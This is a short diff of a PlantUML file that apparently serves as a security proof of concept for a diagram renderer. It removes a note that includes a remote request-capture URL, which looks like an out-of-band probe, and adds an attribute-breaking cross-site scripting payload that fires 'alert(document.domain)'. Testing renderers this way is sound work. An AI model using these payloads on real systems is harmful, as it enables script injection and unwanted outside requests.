@@ -1,6 +1,3 @@
 @startuml 
-[Component] as C
-note bottom of C   
-!include https://xxxz.free.beeceptor.com
-end note
+width: 100px;" onload="alert(document.domain);
 @enduml
